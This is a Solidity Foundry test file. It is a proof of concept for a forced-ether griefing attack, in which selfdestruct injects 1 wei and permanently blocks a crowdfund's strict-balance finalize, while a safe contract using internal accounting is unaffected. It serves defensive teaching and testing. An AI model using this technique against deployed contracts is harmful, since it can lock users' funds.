// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableCrowdfund, SafeCrowdfund, ForceSender} from "../src/forced-ether/ForcedEther.sol";

/// PoC for forced-ether balance assumptions.
///   forge test --match-contract ForcedEtherBalanceAssumption -vvv
///
/// Invariant (SC02): a contract's control flow must not depend on `address(this).balance`, which an
/// attacker can inflate with `selfdestruct`. The vulnerable crowdfund's strict `balance ==
/// totalDeposited` finalize is bricked by one forced wei; the safe version (internal accounting,
/// `>=`) is immune.
///
/// See docs/exploits/forced-ether-balance-assumption.md
contract ForcedEtherBalanceAssumptionTest is Test {
    address attacker = makeAddr("attacker");
    address user = makeAddr("user");

    function test_vulnerable_forcedWeiBricksFinalize() public {
        VulnerableCrowdfund cf = new VulnerableCrowdfund();

        vm.deal(user, 5 ether);
        vm.prank(user);
        cf.deposit{value: 5 ether}();

        // Sanity: finalize works while balance == tracked.
        // (Use a fresh instance to show the "before" path is healthy.)
        VulnerableCrowdfund healthy = new VulnerableCrowdfund();
        vm.deal(user, 5 ether);
        vm.prank(user);
        healthy.deposit{value: 5 ether}();
        healthy.finalize();
        assertTrue(healthy.finalized());

        // Attack: force 1 wei into `cf` via selfdestruct — no payable path needed.
        vm.deal(attacker, 1);
        vm.prank(attacker);
        new ForceSender{value: 1}(address(cf));

        assertEq(address(cf).balance, 5 ether + 1);
        assertEq(cf.totalDeposited(), 5 ether);

        // finalize() now reverts forever: balance can never again equal totalDeposited.
        vm.expectRevert(bytes("balance mismatch"));
        cf.finalize();
        assertFalse(cf.finalized(), "permanently bricked by forced ether");
    }

    function test_safe_forcedEtherIgnored() public {
        SafeCrowdfund cf = new SafeCrowdfund();

        vm.deal(user, 5 ether);
        vm.prank(user);
        cf.deposit{value: 5 ether}();

        // Force ether in — the safe contract uses internal accounting, so it doesn't care.
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        new ForceSender{value: 1 ether}(address(cf));

        cf.finalize();
        assertTrue(cf.finalized(), "forced ether does not affect internal-accounting logic");
    }
}
